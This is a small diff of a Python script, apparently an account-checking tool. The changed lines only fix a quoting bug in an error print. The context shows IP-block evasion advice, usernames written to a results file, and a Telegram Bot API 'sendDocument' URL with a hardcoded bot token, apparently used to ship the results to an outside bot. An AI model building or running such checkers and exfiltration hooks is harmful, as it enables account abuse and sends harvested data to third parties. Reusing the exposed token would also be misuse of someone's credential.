@@ -96,7 +96,9 @@ with open('Results.txt', 'w') as f:
         elif req.json()['error_type'] == 'ip_block':
             print(f'{Z}Your IP Blocked Change IP or use VPN')
             
-        else: print(f'{Z}{req.json()['message']}{Z}', username)
+        else:
+            msg = req.json()['message']
+            print(f'{Z}{msg}{Z}', username)
         
 
 url = f'https://api.telegram.org/bot6243314109:AAEGKJIZkrjK8zB9X5wNeMrx4yUz3dPMhw8/sendDocument'
